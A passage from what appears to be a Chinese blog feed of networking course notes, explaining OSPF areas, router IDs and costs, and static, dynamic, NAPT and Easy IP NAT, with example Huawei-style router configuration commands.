title="OSPF协议优势"></a>OSPF协议优势</h3><p><strong>OSPF协议优势</strong></p><ul><li>利用”累计COST值”计算最优路由</li><li>采用组播形式收发部分协议报文，提高效率</li><li>引入区域概念，支持区域划分，降低设备压力</li><li>支持对等价路由进行负载分担，提高可靠性</li><li>支持报文认证，提高安全性</li><li>OSPF基于IP协议，为了可靠性，数据库同步：协商主从关系，序列号、有确认机制</li></ul><h3 id="OSPF应用场景"><a href="#OSPF应用场景" class="headerlink" title="OSPF应用场景"></a>OSPF应用场景</h3><p><strong>大型企业网络</strong></p><p><strong>基础概念：</strong></p><ul><li>Router ID</li><li>Area ID</li><li>Cost</li></ul><p><img src="/../img/img_artical/net_sec/6.1.1.png" alt="6.1.1"></p><h3 id="OSPF进程号"><a href="#OSPF进程号" class="headerlink" title="OSPF进程号"></a>OSPF进程号</h3><p><strong>OSPF进程号：Process</strong></p><ul><li>OSPF进程可以手动指定，如果未指定，则默认为1</li><li>作用：在同一个设备上，区分不同的OSPF路由协议</li><li>在同一个设备上，进程号不同的OSPF协议相互隔离</li><li>OSPF进程号只在本设备起作用，不在网络中传递</li><li>进程号范围&lt;1-65535&gt;</li></ul><h3 id="Router-ID"><a href="#Router-ID" class="headerlink" title="Router ID"></a>Router ID</h3><p><strong>OSPF使用Router ID唯一的标识一台运行OSPF的路由器</strong></p><ul><li>OSPF协议为路由设备取的名字，用于唯一的表示一台路由设备</li><li>特点：稳定，即一旦确定，就不会改变，除非重启OSPF进程</li><li>Router ID确定方式：可以手动指定，也可以自动选举，建议手动指定</li><li>如果没有手动配置RouterID，则路由器使用Lookback接口中最大的IP地址作为RouterID</li><li>如果没有配置Lookback接口，则路由器使用物理接口中最大的IP地址作为RouterID</li><li>备注：自动选举的前提是所有接口同时运行ospf，如果没有同时运行，哪个接口先启用ospf，就选择哪个接口的地址号做RouterID</li></ul><p><img src="/../img/img_artical/net_sec/6.1.2.png" alt="6.1.2"></p><h3 id="Area-ID"><a href="#Area-ID" class="headerlink" title="Area ID"></a>Area ID</h3><p>Area用于标识一个OSPF的区域</p><ul><li>将路由设备划分为不同的组，每个组用区域号（Area ID）来标识</li><li>网络规模大，路由表庞大，路由设备负担高，OSPF协议通过划分不同的区域来缩减路由表规模，降低路由设备负担</li></ul><p><img src="/../img/img_artical/net_sec/6.1.3.png" alt="6.1.3"></p><p><img src="/../img/img_artical/net_sec/6.1.4.png" alt="6.1.4"></p><h3 id="OSPF区域"><a href="#OSPF区域" class="headerlink" title="OSPF区域"></a>OSPF区域</h3><p><strong>OSPF骨干区域</strong></p><ul><li>区域号为0，表示的是“骨干区域”</li></ul><p><strong>OSPF非骨干区域</strong></p><ul><li>区域号不为0，表示的就是“非骨干区域”</li><li>非骨干区域必须和骨干区域“直接“相连，能实现”区域之间的互通“</li></ul><p><strong>OSPF区域的标识</strong></p><ul><li>通过十进制表示，例如区域0,1,2,3等，范围是0 - 4294967295</li><li>通过点分十进制表示，例如区域0.0.0.0,1.1.1.1,2.2.2.2,3.3.3.3等，范围是0.0.0.0 - 255.255.255.255</li></ul><h3 id="Cost"><a href="#Cost" class="headerlink" title="Cost"></a>Cost</h3><p><strong>Cost：开销</strong></p><ul><li>OSPF使用Cost作为路由的度量值</li><li>每一个开启OSPF功能的物理接口都有一个Cost值，默认值是1</li></ul><p><img src="/../img/img_artical/net_sec/6.1.5.png" alt="6.1.5"></p><p><strong>OSPF路径累计开销值</strong></p><ul><li>流量从源网络到目的网络所经过所有路由器的出接口的cost总和</li><li>例如：R3的路由表中到达10.1.1.0&#x2F;24的OSPF路由的cost是1+1+1&#x3D;3</li></ul><p><img src="/../img/img_artical/net_sec/6.1.6.png" alt="6.1.6"></p><h2 id="OSPF工作过程"><a href="#OSPF工作过程" class="headerlink" title="OSPF工作过程"></a>OSPF工作过程</h2><h3 id="OSPF工作原理"><a href="#OSPF工作原理" class="headerlink" title="OSPF工作原理"></a>OSPF工作原理</h3><ul><li>建立OSPF邻居表</li><li>同步OSPF数据库</li><li>计算OSPF路由表</li></ul><h2 id="OSPF单区域配置"><a href="#OSPF单区域配置" class="headerlink" title="OSPF单区域配置"></a>OSPF单区域配置</h2><h3 id="案例需求"><a href="#案例需求" class="headerlink" title="案例需求"></a>案例需求</h3><p><strong>需求：在不同部门之间的PC互联互通</strong></p><p><strong>如果只有1个区域，则必须为骨干区域：Area 0</strong></p><p><img src="/../img/img_artical/net_sec/6.1.7.png" alt="6.1.7"></p><h3 id="配置思路"><a href="#配置思路" class="headerlink" title="配置思路"></a>配置思路</h3><ul><li>配置网络设备的接口IP地址和掩码</li><li>配置OSPF进程号</li><li>配置OSPF Router ID</li><li>配置OSPF 区域号</li><li>宣告接口的网段到OSPF</li></ul><h3 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>配置OSPF - R1</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ospf</span> <span class="string">1 router-id 1.1.1.1</span></span><br><span class="line"><span class="attr">[R1]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R1]network</span> <span class="string">192.168.12.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R1]network</span> <span class="string">192.168.1.0 0.0.0.255</span></span><br></pre></td></tr></table></figure><p><strong>配置OSPF - R2</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]ospf</span> <span class="string">1 router-id 2.2.2.2</span></span><br><span class="line"><span class="attr">[R2]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R2]network</span> <span class="string">192.168.12.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R2]network</span> <span class="string">192.168.23.0 0.0.0.255</span></span><br></pre></td></tr></table></figure><p><strong>配置OSPF - R3</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R3]ospf</span> <span class="string">1 router-id 3.3.3.3</span></span><br><span class="line"><span class="attr">[R3]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R3]network</span> <span class="string">192.168.2.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R3]network</span> <span class="string">192.168.23.0 0.0.0.255</span></span><br></pre></td></tr></table></figure><h3 id="OSPF邻居表解析"><a href="#OSPF邻居表解析" class="headerlink" title="OSPF邻居表解析"></a>OSPF邻居表解析</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]display</span> <span class="string">ospf peer brief </span></span><br><span class="line"></span><br><span class="line"> <span class="attr">OSPF</span> <span class="string">Process 1 with Router ID 1.1.1.1</span></span><br><span class="line">  <span class="attr">Peer</span> <span class="string">Statistic Information</span></span><br><span class="line"> <span class="attr">----------------------------------------------------------------------------</span></span><br><span class="line"> <span class="attr">Area</span> <span class="string">Id          Interface                        Neighbor id      State    </span></span><br><span class="line"> <span class="attr">0.0.0.12</span>         <span class="string">GigabitEthernet0/0/0             2.2.2.2          Full        </span></span><br><span class="line"></span><br><span class="line"> <span class="attr">----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> #Router ID - 表示OSPF协议为R1起的名字</span></span><br><span class="line"><span class="comment"> #Area ID - 表示R1当前建立邻居关系所在的区域</span></span><br><span class="line"><span class="comment"> #Neighbor ID - 表示邻居路由器的OSPF Router ID</span></span><br><span class="line"><span class="comment"> #State - 表示邻居路由器的状态，最终的完美状态是Full（完全邻接）</span></span><br></pre></td></tr></table></figure><h3 id="OSPF报文类型"><a href="#OSPF报文类型" class="headerlink" title="OSPF报文类型"></a>OSPF报文类型</h3><p><strong>Hello报文：</strong></p><ul><li>用于发现、建立、维护和拆除OSPF邻居</li></ul><p><strong>数据库描述报文（DBD、DD）：</strong></p><ul><li>用于发送OSPF数据库条目的简要信息，实现数据库同步</li></ul><p><strong>链路状态请求报文（LSR）：</strong></p><ul><li>用于请求自己数据库中没有的链路状态通告信息（LSA）</li></ul><p><strong>链路状态更新报文（LSU）</strong></p><ul><li>用于回应LSR报文，发送链路状态信息（LSA）</li></ul><p><strong>链路状态确认报文（LSACK）</strong></p><ul><li>对收到对方的更新报文（LSU）进行确认</li></ul><h3 id="建立邻居关系"><a href="#建立邻居关系" class="headerlink" title="建立邻居关系"></a>建立邻居关系</h3><ul><li>OSPF使用Hello报文发现和建立邻居关系</li><li>在以太网链路上，缺省时，OSPF采用组播的形式发送Hello报文（目的地址224.0.0.5）</li><li>OSPF Hello报文中包含了路由器的RouterID、邻居列表等信息</li></ul><h3 id="邻居建立影响因素"><a href="#邻居建立影响因素" class="headerlink" title="邻居建立影响因素"></a>邻居建立影响因素</h3><p><strong>邻居建立失败原因：</strong></p><ul><li>两台路由器的Router ID相同，不能建立邻居</li><li>两台路由器的Area ID不同，不能建立邻居</li><li>两台路由器的三层不通，不能建立邻居</li></ul><h2 id="OSPF多区域配置"><a href="#OSPF多区域配置" class="headerlink" title="OSPF多区域配置"></a>OSPF多区域配置</h2><h3 id="大型网络中，单区域OSPF存在的问题"><a href="#大型网络中，单区域OSPF存在的问题" class="headerlink" title="大型网络中，单区域OSPF存在的问题"></a>大型网络中，单区域OSPF存在的问题</h3><p><strong>为什么要划分多区域</strong></p><ul><li>数据库庞大</li><li>路由表庞大</li><li>设备压力大，资源消耗高</li><li>无法进行路由汇总</li></ul><p><strong>多区域的优势</strong></p><ul><li>只有同一个区域内的路由器才需要同步数据库，不同区域的路由不需要同步数据库</li><li>所以同步数据库的设备少，数据报文就少，设备压力也小，也不过多浪费带宽</li><li>由于数据报文少，所以数据库最终就小</li><li>数据库小，数据库同步的速度就快，计算路由就快</li><li>数据库小，最终路由器表也小，转发数据的速度就快，公司的网络质量就好</li></ul><h3 id="OSPF路由器类型"><a href="#OSPF路由器类型" class="headerlink" title="OSPF路由器类型"></a>OSPF路由器类型</h3><table><thead><tr><th align="left">路由器类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">区域路由器</td><td align="left">路由器所有接口都属于同一个OSPF区域</td></tr><tr><td align="left">骨干区域路由器</td><td align="left">路由器只要有一个接口属于骨干区域</td></tr><tr><td align="left">区域边界路由器（ABR）</td><td align="left">同时连接着骨干区域和非骨干区域的路由器</td></tr><tr><td align="left">自治区域边界路由器（ASBR）</td><td align="left">与其他AS交换路由信息的路由器称为ASBR，具有产生外部路由能力的路由器</td></tr></tbody></table><h3 id="案例需求-1"><a href="#案例需求-1" class="headerlink" title="案例需求"></a>案例需求</h3><p><strong>企业核心机房，连接不同办公楼宇，实现不同楼宇互通</strong></p><p><img src="/../img/img_artical/net_sec/6.1.8.png" alt="6.1.8"></p><h3 id="配置思路-1"><a href="#配置思路-1" class="headerlink" title="配置思路"></a>配置思路</h3><ul><li><p>如图连接并配置设备接口IP地址</p></li><li><p>将R1和R2设置为区域12，R5和R6设置为区域56</p></li><li><p>将R2&#x2F;R3&#x2F;R4&#x2F;R5设置为区域0，最终实现PC1和PC2的互通</p></li></ul><h3 id="配置命令-1"><a href="#配置命令-1" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>配置OSPF - R1</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ospf</span> <span class="string">1 router-id 1.1.1.1</span></span><br><span class="line"><span class="attr">[R1-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R1-ospf-1-0.0.0.12]network</span> <span class="string">192.168.12.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R1-ospf-1-0.0.0.12]network</span> <span class="string">192.168.1.0 0.0.0.255</span></span><br></pre></td></tr></table></figure><p><strong>配置OSPF - R2</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R2]ospf</span> <span class="string">1 router-id 2.2.2.2</span></span><br><span class="line"><span class="attr">[R2-ospf-1]area</span> <span class="string">12</span></span><br><span class="line"><span class="attr">[R2-ospf-1-0.0.0.12]network</span> <span class="string">192.168.12.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R2-ospf-1-0.0.0.12]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R2-ospf-1-0.0.0.0]network</span> <span class="string">192.168.23.0 0.0.0.255</span></span><br></pre></td></tr></table></figure><p><strong>配置OSPF - R3</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R3]ospf</span> <span class="string">1 router-id 3.3.3.3</span></span><br><span class="line"><span class="attr">[R3-ospf-1]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R3-ospf-1-0.0.0.0]network</span> <span class="string">192.168.34.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R3-ospf-1-0.0.0.0]network</span> <span class="string">192.168.23.0 0.0.0.255</span></span><br></pre></td></tr></table></figure><p><strong>配置OSPF - R4</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R4]ospf</span> <span class="string">1 router-id 4.4.4.4</span></span><br><span class="line"><span class="attr">[R4-ospf-1]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R4-ospf-1-0.0.0.0]network</span> <span class="string">192.168.34.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R4-ospf-1-0.0.0.0]network</span> <span class="string">192.168.45.0 0.0.0.255</span></span><br></pre></td></tr></table></figure><p><strong>配置OSPF - R5</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R5]ospf</span> <span class="string">1 router-id 5.5.5.5</span></span><br><span class="line"><span class="attr">[R5-ospf-1]area</span> <span class="string">56</span></span><br><span class="line"><span class="attr">[R5-ospf-1-0.0.0.56]network</span> <span class="string">192.168.56.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R5-ospf-1-0.0.0.56]area</span> <span class="string">0</span></span><br><span class="line"><span class="attr">[R5-ospf-1-0.0.0.0]network</span> <span class="string">192.168.45.0 0.0.0.255</span></span><br></pre></td></tr></table></figure><p><strong>配置OSPF - R5</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R6]ospf</span> <span class="string">1 router-id 6.6.6.6</span></span><br><span class="line"><span class="attr">[R6-ospf-1]area</span> <span class="string">56</span></span><br><span class="line"><span class="attr">[R6-ospf-1-0.0.0.56]network</span> <span class="string">192.168.56.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R6-ospf-1-0.0.0.56]network</span> <span class="string">192.168.2.0 0.0.0.255</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 园区网路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-园区网实现与安全5</title>
      <link href="/posts/campus5.html"/>
      <url>/posts/campus5.html</url>
      
        <content type="html"><![CDATA[<h1 id="园区网实现与安全"><a href="#园区网实现与安全" class="headerlink" title="园区网实现与安全"></a>园区网实现与安全</h1><h2 id="NAT原理"><a href="#NAT原理" class="headerlink" title="NAT原理"></a>NAT原理</h2><h3 id="NAT技术背景"><a href="#NAT技术背景" class="headerlink" title="NAT技术背景"></a>NAT技术背景</h3><p><strong>NAT技术背景</strong></p><ul><li>为节省IPv4地址，企业内网使用的都是”私有IP地址”</li><li>Internet网络的组成设备，使用都是”公有IP地址”</li><li>所以企业内网要与lnternet 互通，必须拥有”公有IP地址”</li></ul><h3 id="NAT概述"><a href="#NAT概述" class="headerlink" title="NAT概述"></a>NAT概述</h3><p><strong>NAT (Network Address Translation )，网络地址转换</strong></p><ul><li>主要应用在企业网络的边界设备上</li><li>对IP数据报文头部中的”私有IP地址”转换为”公有IP地址”实现内网到外网的访问</li><li>实现对企业内网的保护，增强企业内网的安全性，因为外网无法直接访问内网设备的私有IP地址</li></ul><h3 id="NAT工作原理"><a href="#NAT工作原理" class="headerlink" title="NAT工作原理"></a>NAT工作原理</h3><p><strong>NAT对IP报头中的源IP进行地址转换</strong></p><p><img src="/../img/img_artical/net_sec/5.5.1.png" alt="5.5.1"></p><p><strong>NAT工作表：NAT会话表</strong></p><p><img src="/../img/img_artical/net_sec/5.5.2.png" alt="5.5.2"></p><h3 id="NAT类型"><a href="#NAT类型" class="headerlink" title="NAT类型"></a>NAT类型</h3><p><strong>静态NAT</strong></p><ul><li>私有IP地址和公有IP地址1对1转换，不节省公有IP</li></ul><p><strong>动态NAT</strong></p><ul><li>基于”NAT地址池”实现”私有地址”和”公有地址”之间的随机转换</li><li>一个公有地址在不同的时间可以为多个私有地址进行转换，但在同一时间一个公有地址只能为一个私有地址进行转换，所以要求NAT地址池中的公有地址数量要多于企业内部私有地址的数量，所以这种方式并不常用</li></ul><p><strong>NAPT：网络地址端口转换（Network Address Port Translation）</strong></p><ul><li>多对一的地址转换，使用“IP地址+端口号”的形式进行转换，使多个私有IP地址可共用一个公网IP地址访问外网</li><li>允许多个私有地址转换为同一个公有地址，因此也称为“多对一地址转换”或地址复用</li><li>NAPT的实现方式主要有EasyIP和地址池NAPT</li></ul><p><strong>NAT Server</strong></p><ul><li>NAT Server是一种特殊的静态NAT</li><li>主要应用于外网用户访问企业内网服务器的场景</li></ul><h3 id="NAT总结"><a href="#NAT总结" class="headerlink" title="NAT总结"></a>NAT总结</h3><p><strong>NAT配置在出口设备的出接口上</strong></p><p><strong>NAT转换表</strong></p><ul><li>NAT有一个转换表：一个私有IP 和一个公网IP绑定在一起</li><li>数据包出去的时候，转换源IP： 将源IP由私有IP转换为公有IP，  目标IP不变</li><li>数据包回来的时候，转换目的IP： 将目的IP由公有IP地址，转换为私有IP，源IP不变</li></ul><p><strong>备注</strong></p><ul><li>默认路由解决的是数据出去的问题</li><li>NAT解决的时候数据回来的问题</li></ul><h2 id="静态NAT配置"><a href="#静态NAT配置" class="headerlink" title="静态NAT配置"></a>静态NAT配置</h2><h3 id="静态NAT"><a href="#静态NAT" class="headerlink" title="静态NAT"></a>静态NAT</h3><ul><li>静态NAT也称Basic NAT</li><li>静态NAT属于私有IP地址和公有IP地址1对1转换</li><li>静态NAT只转换IP地址，不转换端口号</li></ul><h3 id="案例需求"><a href="#案例需求" class="headerlink" title="案例需求"></a>案例需求</h3><p><strong>企业内网的PC需要访问”公有服务器”</strong></p><ul><li>企业租用了1个公网地址段：100.1.1.0&#x2F;29</li><li>实现企业内网主机访问外部网络</li></ul><p><img src="/../img/img_artical/net_sec/5.5.3.png" alt="5.5.3"></p><h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><ul><li>在企业网络的边界设备上，配置默认路由，企业内网数据可以发送到Internet</li><li>因为Internet设备上没有”私有IP地址”的路由条目，所以数据无法返回到”企业内网”</li><li>在企业网络的边界设备（路由器）上，使用静态NAT技术，实现”私有IP地址”和”公网IP地址”互相转换</li></ul><h3 id="配置思路"><a href="#配置思路" class="headerlink" title="配置思路"></a>配置思路</h3><ul><li>在企业边界设备R1中配置接口IP地址和掩码</li><li>在企业边界设备R1中配置默认路由，下一跳指向ISP设备</li><li>在企业边界设备R1的出接口配置静态NAT</li></ul><h3 id="配置命令"><a href="#配置命令" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>R1重要配置</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 0.0.0.0 0 100.1.1.2                       //配置默认路由</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">G0/0/1</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]ip</span> <span class="string">address 100.1.1.1 29                            //配置公网接口IP地址</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]nat</span> <span class="string">static global 100.1.1.3 inside 192.168.1.1     //配置静态NAT</span></span><br></pre></td></tr></table></figure><h2 id="动态NAT配置"><a href="#动态NAT配置" class="headerlink" title="动态NAT配置"></a>动态NAT配置</h2><h3 id="动态NAT"><a href="#动态NAT" class="headerlink" title="动态NAT"></a>动态NAT</h3><ul><li>动态NAT基于”NAT地址池”实现”私有地址”和”公有地址”之间的随机转换</li><li>一个公有地址在不同的时间可以为多个私有地址进行转换，但在同一时间一个公有地址只能为一个私有地址进行转换，所以要求NAT地址池中的公有地址数量要多于企业内部私有地址的数量，所以这种方式并不常用</li></ul><h3 id="案例需求-1"><a href="#案例需求-1" class="headerlink" title="案例需求"></a>案例需求</h3><ul><li>企业内网的PC需要访问”公网服务器”</li><li>部署NAT地址池，实现私有IP地址和地址池里面的公网IP地址动态转换，实现内网多个私有主机访问外网</li></ul><p><img src="/../img/img_artical/net_sec/5.5.4.png" alt="5.5.4"></p><h3 id="案例分析-1"><a href="#案例分析-1" class="headerlink" title="案例分析"></a>案例分析</h3><ul><li>企业租用公网地址段100.1.1.0&#x2F;29</li><li>在R1连接”公网”的接口上，部署动态NAT，即让多个私有IP地址轮询使用NAT地址池里面的公网IP地址</li><li>100.1.1.0&#x2F;29子网中，可用IP地址仅有6个<br>地址范围：100.1.1.0-100.1.1.7<br>可用地址范围：100.1.1.1-100.1.1.6<br>100.1.1.1配置在R1出接口，100.1.1.2配置在R2-ISP接口<br>NAT地址池可用剩余地址：100.1.1.3-200.1.1.6</li></ul><h3 id="配置思路-1"><a href="#配置思路-1" class="headerlink" title="配置思路"></a>配置思路</h3><ul><li>在企业边界设备R1中配置接口IP地址和掩码</li><li>在企业边界设备R1中配置默认路由，下一跳指向ISP设备</li><li>在企业边界设备R1中创建公网地址池，用于NAT转换</li><li>在R1中创建ACL，配置允许哪些内网主机地址可以访问公网</li><li>在企业边界设备R1的出接口配置动态NAT</li></ul><h3 id="配置命令-1"><a href="#配置命令-1" class="headerlink" title="配置命令"></a>配置命令</h3><p>R1重要配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 0.0.0.0 0 100.1.1.2                       //配置默认路由</span></span><br><span class="line"><span class="attr">[R1]nat</span> <span class="string">address-group 1 100.1.1.3 100.1.1.5                   //创建NAT地址池</span></span><br><span class="line"><span class="attr">[R1]acl</span> <span class="string">2000                                                  //创建acl</span></span><br><span class="line"><span class="attr">[R1-acl-2000]rule</span> <span class="string">10 permit source 192.168.1.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">G0/0/1</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]ip</span> <span class="string">address 100.1.1.1 29                            //配置公网接口IP地址</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]nat</span> <span class="string">outbound 2000 address-group 1 no-pat           //配置动态NAT，且不做端口转换</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>动态NAT</strong></p><ul><li>基于”NAT地址池”实现”私有IP地址”和”公有IP地址”之间的转换</li><li>一个公有IP地址在不同的时间可以为多个私有IP地址进行转换</li><li>但是在同一时间一个公有IP地址只能为一个私有IP地址的网络会话进行转换</li><li>所以，如果公司的内网设备有同时上网的需求，产生大量网络会话，会导致NAT地址池枯竭</li><li>那么NAT地址池里公有IP地址的数量就需要很多很多，才有可能满足私有IP地址的主机上网的需求</li><li>所以动态NAT也没有达到节省公有IP地址的目的</li></ul><h2 id="NAPT之地址池NAT"><a href="#NAPT之地址池NAT" class="headerlink" title="NAPT之地址池NAT"></a>NAPT之地址池NAT</h2><h3 id="NAPT"><a href="#NAPT" class="headerlink" title="NAPT"></a>NAPT</h3><p><strong>NAPT（Network Address Port Translation）网络地址接口转换</strong></p><ul><li>使用”IP地址 + 端口号”的形式进行转换</li><li>使多个私有IP共用一个公有IP地址访问外网，节约公有IP地址</li><li>可以实现高并发的地址转换，也称为”多对一地址转换”或地址复用</li></ul><p><img src="/../img/img_artical/net_sec/5.5.5.png" alt="5.5.5"></p><h3 id="配置思路-2"><a href="#配置思路-2" class="headerlink" title="配置思路"></a>配置思路</h3><ul><li>在企业边界设备R1中配置IP地址和掩码</li><li>在企业边界设备R1中配置默认路由，下一跳指向ISP设备</li><li>在企业边界设备R1中创建公网地址池，用于NAT转换</li><li>在R1中创建ACL，配置允许哪些内网主机地址可以访问公网</li><li>在边界设备R1的出接口配置NAPT之地址池NAT</li></ul><h3 id="配置命令-2"><a href="#配置命令-2" class="headerlink" title="配置命令"></a>配置命令</h3><p><strong>R1重要配置</strong></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 0.0.0.0 0 100.1.1.2                       //配置默认路由</span></span><br><span class="line"><span class="attr">[R1]nat</span> <span class="string">address-group 1 100.1.1.3 100.1.1.5                   //创建NAT地址池</span></span><br><span class="line"><span class="attr">[R1]acl</span> <span class="string">2000                                                  //创建acl</span></span><br><span class="line"><span class="attr">[R1-acl-2000]rule</span> <span class="string">10 permit source 192.168.1.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">G0/0/1</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]ip</span> <span class="string">address 100.1.1.1 29                            //配置公网接口IP地址</span></span><br><span class="line"><span class="attr">[R1-G0/0/1]nat</span> <span class="string">outbound 2000 address-group                    //配置NAPT，相比动态NAT，缺少了no-pat参数</span></span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><strong>NAPT：网络地址端口转换</strong></p><ul><li>使用”IP地址＋端口号”的形式进行转换，使多个私有IP地址可共用一个公网IP地址访问外网</li><li>允许多个私有地址同时转换为同一个公有地址，因此也称为“多对一地址转换”或地址复用</li><li>NAPT的实现方式主要有EasyIP和地址池NAPT</li><li>地址池NAT在目前企业中应用的最为广泛，是最主流的NAT解决方案</li><li>地址池NAT适用于大型企业，主机数量多企业</li></ul><h2 id="NAPT之Easy-IP"><a href="#NAPT之Easy-IP" class="headerlink" title="NAPT之Easy IP"></a>NAPT之Easy IP</h2><h3 id="案例需求-2"><a href="#案例需求-2" class="headerlink" title="案例需求"></a>案例需求</h3><p><strong>中小型企业，租用公网网段200.1.1.0&#x2F;30</strong></p><ul><li>可用地址范围：200.1.1.1-200.1.1.2，分别配置在边界设备的出接口和ISP设备的设备接口上，没有空闲的公网IP地址可以做NAT转换，所以使用EasyIP</li></ul><p><img src="/../img/img_artical/net_sec/5.5.6.png" alt="5.5.6"></p><h3 id="Easy-IP"><a href="#Easy-IP" class="headerlink" title="Easy IP"></a>Easy IP</h3><ul><li>EasyIP是一种特殊的NAPT，最节省公网IP地址</li><li>EasyIP使用出接口的公网IP地址作为NAT转换后的地址</li><li>EasyIP使用“IP地址+端口号”的形式进行转换</li><li>EasyIP可以利用ACL来控制哪些内部地址可以进行地址转换</li><li>EasyIP方式特别适合中小型局域网访问Internet的情况</li></ul><h3 id="配置思路-3"><a href="#配置思路-3" class="headerlink" title="配置思路"></a>配置思路</h3><ul><li>在企业边界设备R1中配置IP地址和掩码</li><li>在企业边界设备R1中配置默认路由，下一跳指向ISP设备</li><li>在R1中创建ACL，配置允许哪些内网主机地址可以访问公网</li><li>在边界设备R1的出接口配置NAPT之EasyIP</li></ul><h3 id="配置命令-3"><a href="#配置命令-3" class="headerlink" title="配置命令"></a>配置命令</h3><p>R1重要配置</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]ip</span> <span class="string">route-static 0.0.0.0 0 100.1.1.2                       //配置默认路由</span></span><br><span class="line"><span class="attr">[R1]acl</span> <span class="string">2000                                                  //创建acl</span></span><br><span class="line"><span class="attr">[R1-acl-2000]rule</span> <span class="string">10 permit source 192.168.1.0 0.0.0.255</span></span><br><span class="line"><span class="attr">[R1]interface</span> <span class="string">G0/0/1</span></span><br><span 